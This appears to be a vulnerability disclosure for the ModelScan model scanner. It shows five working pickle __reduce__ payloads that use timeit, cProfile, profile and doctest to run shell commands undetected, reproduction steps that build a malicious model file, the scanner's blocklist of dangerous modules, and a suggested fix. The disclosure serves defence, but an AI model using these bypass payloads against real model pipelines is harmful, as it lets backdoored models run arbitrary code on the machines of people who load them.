# ModelScan Bypass: 5 Undetected Code Execution Methods via Pickle Deserialization

## Summary

ModelScan v0.8.7 (latest) fails to detect 5 Python standard library modules that enable arbitrary code execution through pickle deserialization. Malicious pickle/joblib/pytorch model files using these modules pass the scanner as "CLEAN" while executing arbitrary code when loaded.

## Affected Product

- **Product:** ProtectAI ModelScan
- **Repository:** https://github.com/protectai/modelscan
- **Version:** 0.8.7 (all versions affected)
- **Component:** `modelscan/settings.py` — `unsafe_globals` blocklist

## Vulnerability Details

ModelScan uses a blocklist approach (`unsafe_globals` in `settings.py`) to detect dangerous pickle opcodes. The following modules are **missing** from the blocklist despite having functions that execute arbitrary Python code:

### Bypass Method 1: `timeit.timeit()`
```python
import pickle
class Exploit:
    def __reduce__(self):
        import timeit
        return (timeit.timeit, ("__import__('os').system('id')",))
pickle.dumps(Exploit())
```
`timeit.timeit()` internally calls `compile()` + `exec()` on the string argument.

### Bypass Method 2: `timeit.repeat()`
```python
class Exploit:
    def __reduce__(self):
        import timeit
        return (timeit.repeat, ("__import__('os').system('id')",))
```
Same mechanism as `timeit()` but calls it multiple times.

### Bypass Method 3: `cProfile.run()`
```python
class Exploit:
    def __reduce__(self):
        import cProfile
        return (cProfile.run, ("__import__('os').system('id')",))
```
`cProfile.run()` compiles and executes the statement string.

### Bypass Method 4: `profile.run()`
```python
class Exploit:
    def __reduce__(self):
        import profile
        return (profile.run, ("__import__('os').system('id')",))
```
Pure-Python profiler with identical code execution capability.

### Bypass Method 5: `doctest.debug_script()`
```python
class Exploit:
    def __reduce__(self):
        import doctest
        return (doctest.debug_script, ("import os; os.system('id')",))
```
`doctest.debug_script()` compiles and runs the given source text under the debugger.

## Root Cause

In `modelscan/settings.py`, the `unsafe_globals` dictionary lists known dangerous modules:
```python
"unsafe_globals": {
    "CRITICAL": {
        "builtins": ["eval", "exec", ...],
        "os": "*",
        "subprocess": "*",
        "sys": "*",
        # ... other modules
    }
}
```

The modules `timeit`, `cProfile`, `profile`, and `doctest` are **not included** despite containing functions that execute arbitrary Python code from string arguments. This is a fundamental weakness of the blocklist approach — any stdlib module with code execution capability that isn't explicitly listed becomes a bypass vector.

## Impact

- **HuggingFace:** ModelScan is used as a security gate for model uploads. Malicious models using these bypasses would be marked as safe and made available for download.
- **Any ModelScan user:** Organizations relying on ModelScan for supply chain security would have a false sense of safety.
- **Attack scenario:** An attacker uploads a backdoored model to HuggingFace. ModelScan marks it clean. A researcher downloads and loads the model → arbitrary code execution (reverse shell, data exfiltration, cryptominer, etc.)

## Reproduction Steps

1. Install ModelScan:
```bash
pip install modelscan
```

2. Generate a malicious pickle file:
```python
import pickle
class Exploit:
    def __reduce__(self):
        import timeit
        return (timeit.timeit, ("__import__('os').system('echo PWNED > /tmp/proof')",))

with open("malicious_model.pkl", "wb") as f:
    pickle.dump(Exploit(), f, protocol=4)
```

3. Scan with ModelScan:
```bash
modelscan --path malicious_model.pkl
```
**Result:** `No issues found! 🎉`

4. Verify code execution:
```python
import pickle
pickle.load(open("malicious_model.pkl", "rb"))
# Check: cat /tmp/proof → "PWNED"
```

## Suggested Fix

Add the following modules to `unsafe_globals` in `settings.py`:

```python
"CRITICAL": {
    # ... existing entries ...
    "timeit": "*",
    "cProfile": "*",
    "profile": "*",
    "doctest": "*",
}
```

However, the fundamental issue is the blocklist approach. A more robust solution would be an **allowlist** of known-safe pickle globals rather than trying to enumerate all dangerous ones.

## Additional Notes

- These bypass methods work across all pickle protocols (0-5)
- They work for all file extensions ModelScan checks: `.pkl`, `.pickle`, `.joblib`, `.dill`, `.dat`, `.data`, `.bin`, `.pt`, `.pth`, `.ckpt`
- The same bypass applies to both `PickleUnsafeOpScan` and `PyTorchUnsafeOpScan` scanners
